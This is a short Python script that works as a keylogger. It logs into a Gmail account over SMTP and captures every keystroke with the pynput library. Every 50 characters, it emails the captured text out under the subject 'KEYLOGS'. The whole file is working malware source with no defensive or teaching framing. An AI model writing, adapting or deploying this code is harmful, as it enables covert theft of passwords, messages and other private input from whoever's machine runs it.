import getpass
import smtplib

from pynput.keyboard import Key, Listener

#Get the email

email = input("Enter Email: ")
password=getpass.getpass(prompt="Password: ", stream=None)
server=smtplib.SMTP_SSL('smtp.gmail.com', 465)
server.login(email, password)

full_log=""
word=""
email_log_length = 50


def on_press(key):
    global word
    global full_log
    global email_log_length
    global email
    if key==Key.space or key==Key.enter:
        word += " "
        full_log += word
        word=''
        if len(full_log) >= email_log_length:
            send_log(full_log)
            full_log = ''
    elif key == Key.shift_l or key == Key.shift_r:
        return
    elif key == Key.backspace:
        word=word[:-1]
    else:
        char = f'{key}'
        char = char[1:-1]
        word+=char

def send_log(strokes):
    Subject="KEYLOGS"
    msg = 'Subject: {}\n\n{}'.format(Subject, strokes)
    server.sendmail(
        email,
        email,
        msg
    )

with Listener(on_press=on_press) as listener:
    listener.join()
